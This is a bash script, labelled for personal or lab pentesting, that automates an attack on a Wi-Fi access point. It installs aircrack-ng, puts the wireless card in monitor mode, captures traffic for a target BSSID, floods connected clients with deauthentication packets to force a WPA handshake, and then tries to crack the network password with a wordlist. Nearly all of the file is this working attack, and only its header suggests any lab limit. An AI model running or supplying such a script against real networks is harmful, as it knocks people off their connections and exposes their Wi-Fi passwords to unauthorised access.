#!/bin/bash

# ==========================================
# Simple WiFi Handshake Capture Script
# For Personal/Lab Pentesting Only
# ==========================================

# Root check
if [ "$EUID" -ne 0 ]; then
    echo "[!] Please run as root."
    echo "Example: sudo ./wifitest.sh <BSSID> <CHANNEL> <WORDLIST>"
    exit 1
fi

# Argument check
if [ $# -lt 3 ]; then
    echo "[!] Usage:"
    echo "sudo ./wifi.sh <BSSID> <CHANNEL> <WORDLIST>"
    echo
    echo "Example:"
    echo "sudo ./wifitest.sh <BSSID> <CHANNEL> <WORDLISTS>"
    exit 1
fi

# Variables
BSSID=$1
CHANNEL=$2
WORDLIST=$3

INTERFACE="wlan0"
MONITOR_INTERFACE="wlan0"

# ==========================================
# Install required tools
# ==========================================

echo "[+] Updating packages..."
apt update -y

echo "[+] Installing aircrack-ng..."
apt install aircrack-ng -y

# ==========================================
# Enable monitor mode
# ==========================================

echo "[+] Killing interfering processes..."
airmon-ng check kill

echo "[+] Starting monitor mode..."
airmon-ng start $INTERFACE

sleep 3

# ==========================================
# Start capture
# ==========================================

echo "[+] Starting handshake capture..."
echo "[+] BSSID: $BSSID"
echo "[+] Channel: $CHANNEL"

xterm -hold -e "airodump-ng --bssid $BSSID -c $CHANNEL -w capture $MONITOR_INTERFACE" &

sleep 20

# ==========================================
# Send deauthentication packets
# ==========================================

echo "[+] Sending deauthentication packets..."

aireplay-ng --deauth 25 -a $BSSID $MONITOR_INTERFACE

# ==========================================
# Wait for handshake
# ==========================================

echo "[+] Waiting for handshake..."
sleep 50

# ==========================================
# Check handshake
# ==========================================

echo "[+] Attempting password crack..."

aircrack-ng \
-w $WORDLIST \
-b $BSSID \
capture-01.cap

# ==========================================
# Cleanup
# ==========================================

echo "[+] Stopping monitor mode..."

airmon-ng stop $MONITOR_INTERFACE

systemctl restart NetworkManager

echo "[+] Done."
